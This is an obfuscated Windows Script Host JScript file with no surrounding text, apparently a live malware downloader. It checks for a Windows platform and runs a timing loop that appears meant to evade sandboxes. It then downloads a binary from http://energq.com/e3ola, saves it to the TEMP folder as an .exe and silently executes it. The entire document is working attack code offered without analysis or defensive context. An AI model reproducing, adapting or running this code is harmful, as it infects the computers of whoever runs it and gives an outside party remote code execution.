var y = false;
var rc = "CreateObject";
var jo = function fi() {return WScript[rc]("WScript.Shell");}(), MU = 11;
var o = "MSXML2.XMLHTTP";
var Ca = 2123213;
var Yq = 0;
function u(W){jo["Run"](W, Yq, Yq);};
function Y0(){return "" + o;};
function ee(g, nU){Yq = Yq * 1; return g - nU;};
function RK(){return rc;};
/*@cc_on
  @if (@_win32 || @_win64)
    y = true;
  @end
@*/
if (y)
{
var To = "";
function Y(){return 22;};
var J = 0; var HS = 0;
function v()
{
var Pt = new this["Date"]();
var GP = Pt["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var Pt = new this["Date"]();
var YW = Pt["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var Pt = new this["Date"]();
var GV = Pt["getUTCMilliseconds"]();
var J = "Wf";
J = ee(YW, GP);
var HS = "sX";
HS = ee(GV, YW);
To = "open";
return ee(J, HS);
}
var f0 = false;
var U = false;
for (var w = Yq; w < Y() * 1; w++){if (v() != Yq){
f0 = true; 
HS = "31" + 11 * J + HS; 
U = true; 
break;
}}
function C() {return ((f0 == true) && (f0 == U)) ? 1 : Yq;};
if (f0 && C() && U){
function Q() {return jo["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "3rvhppDWXg3kF.exe";};
 Wz = Y0();
 BA = WScript[rc](Wz);
 var f = 1;
 while (f){
try {
BA[To]("GET", "http://energq.com/e3ola", false);
BA["send"]();
Mq = "Sleep";
for (;;){WScript[Mq](Y() * 11); if (BA["readystate"] >= 2 * 2) break;};
f = Yq;
} catch(qb){};
}
function Z(PA) {var KS = (1, 2, 3, 4, 5, PA); return KS;};
cF = WScript[RK()]("ADODB.Stream");
Wz = cF;
Wz[To]();
Wz["type"] = Z(1);
Wz["write"](BA["ResponseBody"]);
cF["position"] = Z(Yq);
Wz["Save" + "ToFile"](Q(), 2);
cF["c"+"lose"]();
Z0 = Q();
u(Z0);
}
}

